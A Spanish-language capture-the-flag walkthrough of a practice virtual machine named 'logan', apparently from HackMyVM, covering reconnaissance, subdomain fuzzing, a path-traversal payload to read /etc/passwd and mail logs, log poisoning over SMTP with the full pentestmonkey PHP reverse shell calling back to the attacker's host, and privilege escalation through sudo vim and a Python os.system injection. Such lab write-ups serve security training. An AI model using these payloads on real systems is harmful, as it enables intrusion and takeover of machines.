<img width="355" height="374" alt="Pasted image 20260205084855" src="https://github.com/user-attachments/assets/855a466c-c049-4a1d-82a8-57041b5b4e7e" />

Lo primero que tenemos que hacer es encontrar la IP de la maquina dentro de la red con el siguiente comando.

```bash
sudo arp-scan -I eth1 --localnet
```

Esto nos arroja las direcciones IP dentro de la red:

```bash
Interface: eth1, type: EN10MB, MAC: 08:00:27:1f:f5:b3, IPv4: 10.0.11.3
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.11.1	52:55:0a:00:0b:01	(Unknown: locally administered)
10.0.11.2	08:00:27:01:dc:b2	(Unknown)
10.0.11.10	08:00:27:ff:80:e7	(Unknown)

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.846 seconds (138.68 hosts/sec). 3 responded
```

Como estamos dentro de un entorno virtual nos fijamos en las que tienen una MAC que empieza por **08:00:** ya que hacen referencia a Virtualbox y obtenemos que la IP obgetivo es **10.0.11.10**.

Añadiremos la IP a la variable $TARGET para así no tener que recordarla en cada paso.

```bash
settarget 10.0.11.10
```

Ahora escanearemos los puertos y servicios para ver posibles vectores:

```bash
gomap -s $TARGET
```

Obtenemos el resultado siguiente:

```bash
PORT    STATE  SERVICE      VERSION
25      open    ftp     logan.hmv ESMTP Postfix
80      open    http    Apache 2.4.52 (Ubuntu)
```

Tenemos dos puertos abiertos:
- 25 para protocolo ftp
- 80 para protocolo http/web

Así mismo notamos que hay un posible dominio configurado **logan.hmv**, lo comprobaremos mas adelante.

Al poner la IP en el navegador comprobamos que necesitamos indicar el dominio:

<img width="565" height="240" alt="Pasted image 20260205102034" src="https://github.com/user-attachments/assets/5938adf4-46e5-43f7-8103-b15b675ed61b" />

Para esto editaremos el fichero **hosts** del sistema y añadiremos la IP y el dominio.

```bash
sudo nano /etc/hosts
```

```txt
127.0.0.1       localhost
127.0.1.1       jd-sec.intracof.local   jd-sec

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

10.0.11.10 logan.hmv
```

Ahora si podemos entrar a la web desde la url http://logan.hmv

<img width="1045" height="531" alt="Pasted image 20260205102401" src="https://github.com/user-attachments/assets/f8263fcd-735a-4792-84f0-c50702f25c82" />

En la web no vemos ningún dato interesante que podamos utilizar, así que procederemos a buscar desde consola.

Primero miramos las tecnologías:

```bash
whatweb http://logan.hmv
```

```bash
http://logan.hmv [200 OK] Apache[2.4.52], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.0.11.10], JQuery[3.4.1], Script[text/javascript], Title[Logan], X-UA-Compatible[IE=edge]
```

Tampoco obtenemos información relevante, así que probaremos con un reconocimiento de los directorios a ver si encontramos algo.

```bash
gobuster dir -u http://logan.hmv/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

Al no obtener ningún resultado viable suponemos que podemos estar frente a subdominios, vamos a descubrirlos.

```bash
wfuzz -c --hc=404 --hl=1 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.logan.hmv" -u $TARGET
```

Con lo que descubrimos que hay un subdominio llamado **admin** lo cual nos lleva a un panel de control.

Pero para que funcione tenemos que añadir al fichero /etc/hosts este subdominio

```txt
127.0.0.1       localhost
127.0.1.1       jd-sec.intracof.local   jd-sec

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

10.0.11.10 logan.hmv admin.logan.hmv
```

<img width="979" height="525" alt="Pasted image 20260205105010" src="https://github.com/user-attachments/assets/0467cee2-e95e-44de-bf96-f85d10e1edd5" />

Al ver que tenemos una opción para subir ficheros intentaremos realizar un RFI (Remote File Inclusion) para así obtener una Rever Shell.

Primero nos pondremos a la escucha por el puerto 443

```bash
penelope -p 443
```

Con el pluging de navegador **Hack-Tools** descargamos el código de Reverse Shell de Pentestmonkey's.

<img width="759" height="598" alt="Pasted image 20260205105448" src="https://github.com/user-attachments/assets/6c434aab-624a-484b-8bf7-50e4886392c3" />

Una vez descargado probamos a subirlo desde el panel.

Parece que el fichero subió, pero no muestra información, tendremos que realizar un reconocimiento de directorios a ver donde puede estar.

```bash
gobuster dir -u http://admin.logan.hmv/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

Pero tampoco encontramos nada, lo que nos indica que no hay subida de ficheros.

En la sección de *logs* tampoco encontramos nada así que solo nos queda la opción de *payments*.

<img width="414" height="92" alt="Pasted image 20260205113247" src="https://github.com/user-attachments/assets/a806411b-b3d0-43d3-a9e7-fa5ef005a8bc" />

Se intenta con SQLi pero no hay resultados, esto nos da a pensar que es posible que podamos obtener un Path Traversal ya que los datos los tiene que leer de un fichero.

Al probar a introducir la secuencia para ver el fichero *passwd* obtenemos el fichero indicado:

```txt
....//....//....//....//....//etc/passwd
```

<img width="718" height="589" alt="Pasted image 20260205114041" src="https://github.com/user-attachments/assets/2f0f9638-1bc0-4822-b3e9-f98d2b17ffe0" />

Teniendo la opción de leer ficheros nos da mas posibilidades y teniendo en cuenta que el puerto 25 esta abierto y es usado para el correo veamos si podemos leer el fichero de log del correo para hacer un Log Poisoning.

```txt
....//....//....//....//....//var/log/mail.log
```

<img width="1199" height="837" alt="Pasted image 20260205122035" src="https://github.com/user-attachments/assets/2d020e5a-b13c-4ed7-93f5-474ee2e45a47" />

Bien, ahora solo nos queda intentar un Reverse Shell inyectando código.

nos conectaremos vía telnet para enviar un mail interno, como tenemos el fichero **passwd** vemos que hay 2 usuarios:
- www-data
- logan

Usaremos a *logan* para enviar un mail a *www-data* con el siguiente payload en el cuerpo:

```bash
Trying 10.0.11.10...
Connected to 10.0.11.10.
Escape character is '^]'.
220 logan.hmv ESMTP Postfix (Ubuntu)
MAIL FROM:logan@logan.hmv
250 2.1.0 Ok
RCPT TO:www-data@logan.hmv
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>

  <?php
  // php-reverse-shell - A Reverse Shell implementation in PHP
  // Copyright (C) 2007 pentestmonkey@pentestmonkey.net

  set_time_limit (0);
  $VERSION = "1.0";
  $ip = '10.0.11.3';  // You have changed this
  $port = 443;  // And this
  $chunk_size = 1400;
  $write_a = null;
  $error_a = null;
  $shell = 'uname -a; w; id; /bin/sh -i';
  $daemon = 0;
  $debug = 0;

  //
  // Daemonise ourself if possible to avoid zombies later
  //

  // pcntl_fork is hardly ever available, but will allow us to daemonise
  // our php process and avoid zombies.  Worth a try...
  if (function_exists('pcntl_fork')) {
    // Fork and have the parent process exit
    $pid = pcntl_fork();
    
    if ($pid == -1) {
      printit("ERROR: Can't fork");
      exit(1);
    }
    
    if ($pid) {
      exit(0);  // Parent exits
    }

    // Make the current process a session leader
    // Will only succeed if we forked
    if (posix_setsid() == -1) {
      printit("Error: Can't setsid()");
      exit(1);
    }

    $daemon = 1;
  } else {
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
  }

  // Change to a safe directory
  chdir("/");

  // Remove any umask we inherited
  umask(0);

  //
  // Do the reverse shell...
  //

  // Open reverse connection
  $sock = fsockopen($ip, $port, $errno, $errstr, 30);
  if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
  }

  // Spawn shell process
  $descriptorspec = array(
    0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
    1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
    2 => array("pipe", "w")   // stderr is a pipe that the child will write to
  );

  $process = proc_open($shell, $descriptorspec, $pipes);

  if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
  }

  // Set everything to non-blocking
  // Reason: Occsionally reads will block, even though stream_select tells us they won't
  stream_set_blocking($pipes[0], 0);
  stream_set_blocking($pipes[1], 0);
  stream_set_blocking($pipes[2], 0);
  stream_set_blocking($sock, 0);

  printit("Successfully opened reverse shell to $ip:$port");

  while (1) {
    // Check for end of TCP connection
    if (feof($sock)) {
      printit("ERROR: Shell connection terminated");
      break;
    }

    // Check for end of STDOUT
    if (feof($pipes[1])) {
      printit("ERROR: Shell process terminated");
      break;
    }

    // Wait until a command is end down $sock, or some
    // command output is available on STDOUT or STDERR
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    // If we can read from the TCP socket, send
    // data to process's STDIN
    if (in_array($sock, $read_a)) {
      if ($debug) printit("SOCK READ");
      $input = fread($sock, $chunk_size);
      if ($debug) printit("SOCK: $input");
      fwrite($pipes[0], $input);
    }

    // If we can read from the process's STDOUT
    // send data down tcp connection
    if (in_array($pipes[1], $read_a)) {
      if ($debug) printit("STDOUT READ");
      $input = fread($pipes[1], $chunk_size);
      if ($debug) printit("STDOUT: $input");
      fwrite($sock, $input);
    }

    // If we can read from the process's STDERR
    // send data down tcp connection
    if (in_array($pipes[2], $read_a)) {
      if ($debug) printit("STDERR READ");
      $input = fread($pipes[2], $chunk_size);
      if ($debug) printit("STDERR: $input");
      fwrite($sock, $input);
    }
  }

  fclose($sock);
  fclose($pipes[0]);
  fclose($pipes[1]);
  fclose($pipes[2]);
  proc_close($process);

  // Like print, but does nothing if we've daemonised ourself
  // (I can't figure out how to redirect STDOUT like a proper daemon)
  function printit ($string) {
    if (!$daemon) {
      print "$string
";
    }
  }

  ?> 
.
250 2.0.0 Ok: queued as 9222C60A4F
```

Ahora solo tenemos que usar el campo de búsqueda para lanzar el *payload* y como ya teníamos a **penelope** a la escucha enseguida obtenemos una *Reverse Shell*.

```txt
....//....//....//....//....//var/mail/www-data
```

<img width="931" height="705" alt="Pasted image 20260205124435" src="https://github.com/user-attachments/assets/ba0a49d5-3eee-4e04-8424-f856f82f58d7" />

Ahora  tendremos que buscar flags y escalar privilegios.

La primera flag la encontramos en:

```bash
www-data@logan:/$ cat /home/logan/user.txt
```

Ahora miremos si podemos escalar privilegios de manera simple.

```bash
www-data@logan:/$ sudo -l
Matching Defaults entries for www-data on logan:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on logan:
    (logan) NOPASSWD: /usr/bin/vim
```

Como podemos ver podemos realizar la escalada con ***vim*** así que vamos intentarlo.

Buscaremos en la web https://gtfobins.org/ para encontrar el método correcto.

```bash
sudo -u logan vim -c ':!/bin/bash'
```

Cabe destacar que este comando no es 100% de la web ya que en la web hacen referencia al uso de ***vi*** pero nosotros solo tenemos que cambiar el nombre del ejecutable para que funcione.

Ahora somo el usuario logan, pero queremos llegar a ser root, veamos si lo conseguimos.

```bash
logan@logan:/$ sudo -l
Matching Defaults entries for logan on logan:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User logan may run the following commands on logan:
    (root) NOPASSWD: /usr/bin/python3 /opt/learn_some_python.py
```

Observamos que podemos ser **root** usando *python3* y el fichero de ejecución que se indica.

```bash
sudo /usr/bin/python3 /opt/learn_some_python.py
```

Y ya conseguimos el acceso como *root*.

```bash
Welcome!!!

 The first you need to now is how to use print, please type print('hello')

import os; os.system("/bin/bash")
root@logan:/
```

Ahora solo queda obtener la flag.

```
root@logan:/# cat /root/root.tx
```
